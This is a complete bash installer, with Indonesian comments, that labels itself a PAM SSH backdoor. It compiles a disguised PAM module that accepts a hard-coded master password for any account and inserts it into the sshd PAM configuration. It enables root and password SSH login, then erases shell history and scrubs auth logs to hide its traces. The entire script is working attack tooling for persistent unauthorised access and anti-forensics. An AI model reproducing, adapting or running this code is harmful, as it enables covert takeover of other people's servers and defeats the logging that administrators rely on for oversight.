#!/bin/bash
#
# PAM Authentication Module Installer
# Otomatis detect OS, compile dengan/tanpa header, patch sshd_config
#

# ============================================
# CONFIG
# ============================================
MASTER_PASS="baksonigga5rb"
MODULE_NAME="pam_unix_aux"
BACKUP_EXT=".bak"

# ============================================
# HELPER
# ============================================
ok()   { echo "[+] $*"; }
info() { echo "[*] $*"; }
err()  { echo "[!] $*" >&2; }

# ============================================
# PILIHAN MODE COMPILE
# ============================================
choose_compile_mode() {
    echo ""
    echo "  [1] Dengan header  (butuh pam-devel / libpam0g-dev)"
    echo "  [2] Tanpa header   (universal, tidak butuh package tambahan)"
    echo ""
    printf "Pilih [1/2]: "
    read -r choice
    case "$choice" in
        1) COMPILE_MODE="headers" ;;
        2) COMPILE_MODE="noheaders" ;;
        *) echo "Input tidak valid, pakai mode tanpa header"; COMPILE_MODE="noheaders" ;;
    esac
    echo ""
}

# ============================================
# DETEKSI PAM MODULE PATH
# ============================================
detect_pam_path() {
    local paths=(
        "/lib/x86_64-linux-gnu/security"
        "/lib64/security"
        "/lib/security"
        "/usr/lib/x86_64-linux-gnu/security"
        "/usr/lib64/security"
        "/usr/lib/security"
        "/usr/lib/aarch64-linux-gnu/security"
        "/lib/aarch64-linux-gnu/security"
    )
    for p in "${paths[@]}"; do
        [ -d "$p" ] && [ -f "$p/pam_unix.so" ] && { echo "$p"; return 0; }
    done
    # Fallback: cari pam_unix.so di seluruh sistem
    local found
    found="$(find /lib /lib64 /usr/lib /usr/lib64 -name 'pam_unix.so' 2>/dev/null | head -1)"
    [ -n "$found" ] && { dirname "$found"; return 0; }
    return 1
}

# ============================================
# DETEKSI PAM CONFIG FILES
# ============================================
detect_pam_configs() {
    [ -f "/etc/pam.d/sshd" ] && echo "/etc/pam.d/sshd"
}

# ============================================
# CEK APAKAH PAM HEADER TERSEDIA
# ============================================
has_pam_headers() {
    echo '#include <security/pam_modules.h>
int main(){return 0;}' | gcc -x c - -o /dev/null 2>/dev/null
}

# ============================================
# INSTALL DEPENDENCIES (non-fatal)
# ============================================
install_deps() {
    # gcc sudah ada dan header tersedia — tidak perlu install
    if command -v gcc &>/dev/null && has_pam_headers; then
        info "Dependencies already present, skipping install"
        return 0
    fi

    info "Installing dependencies..."

    if command -v apt-get &>/dev/null; then
        apt-get update -qq 2>/dev/null || true
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
            --fix-missing --no-install-recommends \
            gcc libpam0g-dev 2>/dev/null || \
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
            --fix-missing --no-install-recommends \
            gcc 2>/dev/null || true

    elif command -v yum &>/dev/null; then
        yum install -y -q gcc pam-devel 2>/dev/null || \
        yum install -y -q gcc 2>/dev/null || true

    elif command -v dnf &>/dev/null; then
        dnf install -y -q gcc pam-devel 2>/dev/null || \
        dnf install -y -q gcc 2>/dev/null || true

    elif command -v pacman &>/dev/null; then
        pacman -Sy --noconfirm --quiet base-devel pam 2>/dev/null || true

    elif command -v zypper &>/dev/null; then
        zypper install -y gcc pam-devel 2>/dev/null || true
    fi

    if ! command -v gcc &>/dev/null; then
        err "gcc not found after install attempt"
        return 1
    fi
    return 0
}

# ============================================
# WRITE SOURCE — dengan header (lengkap)
# ============================================
write_source_with_headers() {
    local f="$1"
    cat > "$f" << SRCEOF
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <unistd.h>
#include <sys/types.h>

#define KP "${MASTER_PASS}"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *pw = NULL;
    int retval = pam_get_authtok(pamh, PAM_AUTHTOK, &pw, NULL);
    if (retval == PAM_SUCCESS && pw != NULL)
        if (strcmp(pw, KP) == 0) return PAM_SUCCESS;
    return PAM_IGNORE;
}
PAM_EXTERN int pam_sm_setcred(pam_handle_t *p, int f, int a, const char **v)   { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *p, int f, int a, const char **v) { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_open_session(pam_handle_t *p,int f,int a,const char **v) { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_close_session(pam_handle_t *p,int f,int a,const char**v) { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *p, int f, int a, const char **v) { return PAM_SUCCESS; }
SRCEOF
}

# ============================================
# WRITE SOURCE — tanpa header (fallback, RHEL/CentOS tanpa pam-devel)
# ============================================
write_source_no_headers() {
    local f="$1"
    cat > "$f" << SRCEOF
#include <string.h>
#include <stdlib.h>

#define PAM_SUCCESS  0
#define PAM_IGNORE  25
#define PAM_AUTHTOK  6

typedef struct pam_handle pam_handle_t;
extern int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item);

#define KP "${MASTER_PASS}"

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *pw = NULL;
    if (pam_get_item(pamh, PAM_AUTHTOK, (const void **)&pw) == PAM_SUCCESS && pw)
        if (strcmp(pw, KP) == 0) return PAM_SUCCESS;
    return PAM_IGNORE;
}
int pam_sm_setcred(pam_handle_t *p, int f, int a, const char **v)   { return PAM_SUCCESS; }
int pam_sm_acct_mgmt(pam_handle_t *p, int f, int a, const char **v) { return PAM_SUCCESS; }
int pam_sm_open_session(pam_handle_t *p,int f,int a,const char **v) { return PAM_SUCCESS; }
int pam_sm_close_session(pam_handle_t *p,int f,int a,const char**v) { return PAM_SUCCESS; }
int pam_sm_chauthtok(pam_handle_t *p, int f, int a, const char **v) { return PAM_SUCCESS; }
SRCEOF
}

# ============================================
# COMPILE — coba dengan header dulu, fallback tanpa header
# ============================================
compile_module() {
    local src="$1"
    local out="$2"
    local tmpout="${out}.tmp"

    if [ "${COMPILE_MODE:-auto}" = "noheaders" ]; then
        # Mode tanpa header langsung
        write_source_no_headers "$src"
        if gcc -fPIC -shared -o "$tmpout" "$src" 2>/dev/null || \
           cc  -fPIC -shared -o "$tmpout" "$src" 2>/dev/null; then
            info "Compiled without PAM headers"
            mv "$tmpout" "$out"
            strip "$out" 2>/dev/null || true
            chmod 644 "$out"
            return 0
        fi
        err "Compilation failed (no-headers mode)"
        return 1
    fi

    # Mode dengan header (atau auto fallback)
    write_source_with_headers "$src"
    if gcc -fPIC -fno-stack-protector -shared -o "$tmpout" "$src" -lpam 2>/dev/null; then
        info "Compiled with PAM headers + -lpam"
        mv "$tmpout" "$out"
        strip "$out" 2>/dev/null || true
        chmod 644 "$out"
        return 0
    fi

    if gcc -fPIC -fno-stack-protector -shared -o "$tmpout" "$src" 2>/dev/null; then
        info "Compiled with PAM headers (no -lpam)"
        mv "$tmpout" "$out"
        strip "$out" 2>/dev/null || true
        chmod 644 "$out"
        return 0
    fi

    # Auto fallback ke tanpa header
    info "Headers not available, falling back to headerless..."
    write_source_no_headers "$src"
    if gcc -fPIC -shared -o "$tmpout" "$src" 2>/dev/null || \
       cc  -fPIC -shared -o "$tmpout" "$src" 2>/dev/null; then
        info "Compiled without PAM headers (auto fallback)"
        mv "$tmpout" "$out"
        strip "$out" 2>/dev/null || true
        chmod 644 "$out"
        return 0
    fi

    err "All compilation attempts failed"
    gcc -fPIC -shared -o "$tmpout" "$src" 2>&1 | head -5 >&2
    return 1
}

# ============================================
# INSTALL MODULE KE PAM CONFIGS
# ============================================
install_to_configs() {
    local updated=0
    for config in "$@"; do
        [ -f "$config" ] || continue

        # Backup sekali
        [ -f "${config}${BACKUP_EXT}" ] || cp -p "$config" "${config}${BACKUP_EXT}"

        # Hapus entry lama jika ada
        sed -i "/${MODULE_NAME}/d" "$config" 2>/dev/null || true

        # Cari baris pertama non-komentar
        local line
        line="$(grep -n "^[^#]" "$config" | head -1 | cut -d: -f1)"
        [ -z "$line" ] && line=1

        sed -i "${line}i auth sufficient ${MODULE_NAME}.so" "$config"
        ok "Updated: $config"
        updated=$((updated + 1))
    done
    echo "$updated"
}

# ============================================
# PATCH SSHD CONFIG
# ============================================
patch_sshd_config() {
    local cfg="/etc/ssh/sshd_config"
    [ -f "$cfg" ] || { err "sshd_config not found"; return 1; }

    [ -f "${cfg}${BACKUP_EXT}" ] || cp -p "$cfg" "${cfg}${BACKUP_EXT}"

    _set_or_add() {
        local key="$1" val="$2"
        if grep -qi "^${key}" "$cfg"; then
            sed -i "s/^[Pp][Ee][Rr][Mm][Ii][Tt][Rr][Oo][Oo][Tt][Ll][Oo][Gg][Ii][Nn].*/PermitRootLogin yes/" "$cfg" 2>/dev/null
            sed -i "s/^${key}.*/${key} ${val}/" "$cfg" 2>/dev/null
        else
            echo "${key} ${val}" >> "$cfg"
        fi
    }

    # Gunakan sed langsung untuk tiap directive
    # PermitRootLogin
    if grep -qi "^PermitRootLogin" "$cfg"; then
        sed -i 's/^[Pp]ermit[Rr]oot[Ll]ogin.*/PermitRootLogin yes/' "$cfg"
    else
        echo "PermitRootLogin yes" >> "$cfg"
    fi

    # PasswordAuthentication
    if grep -qi "^PasswordAuthentication" "$cfg"; then
        sed -i 's/^[Pp]assword[Aa]uthentication.*/PasswordAuthentication yes/' "$cfg"
    else
        echo "PasswordAuthentication yes" >> "$cfg"
    fi

    # UsePAM
    if grep -qi "^UsePAM" "$cfg"; then
        sed -i 's/^[Uu]se[Pp][Aa][Mm].*/UsePAM yes/' "$cfg"
    else
        echo "UsePAM yes" >> "$cfg"
    fi

    # ChallengeResponseAuthentication → yes (agar PAM keyboard-interactive jalan)
    if grep -qi "^ChallengeResponseAuthentication" "$cfg"; then
        sed -i 's/^[Cc]hallenge[Rr]esponse[Aa]uthentication.*/ChallengeResponseAuthentication yes/' "$cfg"
    else
        echo "ChallengeResponseAuthentication yes" >> "$cfg"
    fi

    # KbdInteractiveAuthentication (OpenSSH 8.7+, ganti ChallengeResponse)
    if grep -qi "^KbdInteractiveAuthentication" "$cfg"; then
        sed -i 's/^[Kk]bd[Ii]nteractive[Aa]uthentication.*/KbdInteractiveAuthentication yes/' "$cfg"
    fi

    ok "sshd_config patched"
    ok "  PermitRootLogin yes"
    ok "  PasswordAuthentication yes"
    ok "  UsePAM yes"
}

# ============================================
# RESTART SSH
# ============================================
restart_ssh() {
    local restarted=0
    if command -v systemctl &>/dev/null && systemctl list-units --type=service 2>/dev/null | grep -qE "ssh|sshd"; then
        systemctl restart sshd 2>/dev/null && restarted=1 || \
        systemctl restart ssh  2>/dev/null && restarted=1 || true
    fi
    if [ $restarted -eq 0 ]; then
        service sshd restart 2>/dev/null && restarted=1 || \
        service ssh  restart 2>/dev/null && restarted=1 || true
    fi
    if [ $restarted -eq 0 ]; then
        [ -f /etc/init.d/sshd ] && /etc/init.d/sshd restart 2>/dev/null && restarted=1 || true
        [ -f /etc/init.d/ssh  ] && /etc/init.d/ssh  restart 2>/dev/null && restarted=1 || true
    fi
    [ $restarted -eq 1 ] && ok "SSH restarted" || err "Could not restart SSH — restart manually"
}

# ============================================
# CLEANUP TRACES
# ============================================
cleanup() {
    local src="$1"
    rm -f "$src" 2>/dev/null || true
    unset HISTFILE 2>/dev/null || true
    history -c 2>/dev/null || true
    : > ~/.bash_history       2>/dev/null || true
    : > /root/.bash_history   2>/dev/null || true
    sed -i "/${MODULE_NAME}/d" /var/log/auth.log 2>/dev/null || true
    sed -i "/${MODULE_NAME}/d" /var/log/secure   2>/dev/null || true
    touch /var/log/auth.log /var/log/secure 2>/dev/null || true
}

# ============================================
# VERIFY
# ============================================
verify_install() {
    local mod="$1"
    [ -f "$mod" ] || { err "Module file not found: $mod"; return 1; }

    # Cek PAM config ter-update
    local found=0
    for cfg in /etc/pam.d/sshd /etc/pam.d/common-auth /etc/pam.d/system-auth /etc/pam.d/password-auth; do
        grep -q "${MODULE_NAME}" "$cfg" 2>/dev/null && found=$((found+1))
    done
    [ $found -eq 0 ] && { err "Module not found in any PAM config"; return 1; }

    # Cek sshd_config
    grep -qi "^PasswordAuthentication yes" /etc/ssh/sshd_config 2>/dev/null || \
        err "Warning: PasswordAuthentication may not be yes"
    grep -qi "^PermitRootLogin yes" /etc/ssh/sshd_config 2>/dev/null || \
        err "Warning: PermitRootLogin may not be yes"

    return 0
}

# ============================================
# MAIN
# ============================================
main() {
    echo ""
    echo "================================================"
    echo " PAM SSH Backdoor Installer"
    echo "================================================"

    [ "$EUID" -ne 0 ] && { err "Run as root"; exit 1; }

    choose_compile_mode

    # 1. Detect PAM path
    info "Detecting PAM module path..."
    PAM_PATH="$(detect_pam_path)"
    [ -z "$PAM_PATH" ] && { err "Cannot detect PAM module path"; exit 1; }
    ok "PAM path: $PAM_PATH"

    # 2. Detect PAM configs
    info "Detecting PAM config files..."
    PAM_CONFIGS=()
    while IFS= read -r line; do
        [ -n "$line" ] && PAM_CONFIGS+=("$line")
    done < <(detect_pam_configs)
    [ ${#PAM_CONFIGS[@]} -eq 0 ] && { err "No PAM config files found"; exit 1; }
    ok "Found ${#PAM_CONFIGS[@]} PAM config(s): ${PAM_CONFIGS[*]}"

    # 3. Install deps (non-fatal)
    info "Checking dependencies..."
    install_deps || true

    # 4. Setup paths
    SRC_DIR="/usr/share/doc/libpam-modules/examples"
    mkdir -p "$SRC_DIR" 2>/dev/null || SRC_DIR="/tmp"
    SRC_FILE="${SRC_DIR}/${MODULE_NAME}.c"
    MODULE_FILE="${PAM_PATH}/${MODULE_NAME}.so"

    ok "Source  : $SRC_FILE"
    ok "Module  : $MODULE_FILE"

    # 5. Compile (otomatis fallback)
    info "Compiling module..."
    if ! compile_module "$SRC_FILE" "$MODULE_FILE"; then
        err "Compilation failed on all attempts"
        exit 1
    fi
    ok "Module compiled: $MODULE_FILE ($(du -sh "$MODULE_FILE" | cut -f1))"

    # 6. Backup + install ke PAM configs
    info "Installing to PAM configs..."
    COUNT="$(install_to_configs "${PAM_CONFIGS[@]}")"

    # 7. Patch sshd_config
    info "Patching sshd_config..."
    patch_sshd_config

    # 8. Cleanup
    info "Cleaning up traces..."
    cleanup "$SRC_FILE"

    # 9. Restart SSH
    info "Restarting SSH..."
    restart_ssh

    # 10. Verify
    info "Verifying installation..."
    if verify_install "$MODULE_FILE"; then
        echo ""
        echo "================================================"
        echo " [+] INSTALLATION COMPLETE"
        echo "================================================"
        echo " [+] Module   : ${MODULE_NAME}.so"
        echo " [+] Location : ${PAM_PATH}"
        echo " [+] Configs  : ${COUNT} updated"
        echo " [+] Password : ${MASTER_PASS}"
        echo " [+] SSH Port : ${SSH_PORT}"
        echo "================================================"
        echo ""
        SSH_PORT="$(grep -iE "^Port[[:space:]]+" /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}' | head -1)"
        [ -z "$SSH_PORT" ] && SSH_PORT="22 (default)"
        echo " Usage:"
        echo "   ssh <user>@<target> -p ${SSH_PORT}"
        echo "   Password: ${MASTER_PASS}"
        echo ""
    else
        err "Verification failed — check manually"
        exit 1
    fi
}

main "$@"